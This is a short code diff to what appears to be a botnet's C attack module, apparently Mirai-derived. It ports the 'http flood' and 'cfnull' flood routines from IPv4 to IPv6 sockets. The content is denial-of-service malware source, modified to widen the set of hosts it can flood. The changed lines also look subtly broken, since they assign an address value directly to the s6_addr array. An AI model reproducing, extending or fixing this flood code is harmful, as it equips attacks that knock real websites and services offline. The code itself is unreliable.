@@ -152,7 +152,7 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
             if (conn->state == HTTP_CONN_INIT)
             {
-                struct sockaddr_in addr = {0};
+                struct sockaddr_in6 addr = {0};
 
                 if (conn->fd != -1)
                     close(conn->fd);
@@ -164,13 +164,13 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 ii = 65535;
                 setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));
 
-                addr.sin_family = AF_INET;
-                addr.sin_addr.s_addr = conn->dst_addr;
-                addr.sin_port = htons(dport);
+                addr.sin6_family = AF_INET6;
+                addr.sin6_addr.s6_addr = conn->dst_addr;
+                addr.sin6_port = htons(dport);
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
-                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in6));
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n", conn->fd);
 #endif
@@ -935,7 +935,7 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
 
             if (conn->state == HTTP_CONN_INIT)
             {
-                struct sockaddr_in addr = {0};
+                struct sockaddr_in6 addr = {0};
 
                 if (conn->fd != -1)
                     close(conn->fd);
@@ -947,13 +947,13 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
                 ii = 65535;
                 setsockopt(conn->fd, 0, SO_RCVBUF, &ii ,sizeof(int));
 
-                addr.sin_family = AF_INET;
-                addr.sin_addr.s_addr = conn->dst_addr;
-                addr.sin_port = htons(80);
+                addr.sin6_family = AF_INET6;
+                addr.sin6_addr.s6_addr = conn->dst_addr;
+                addr.sin6_port = htons(80);
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
-                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+                connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in6));
 #ifdef DEBUG
                 printf("[http flood] fd%d started connect\n", conn->fd);
 #endif
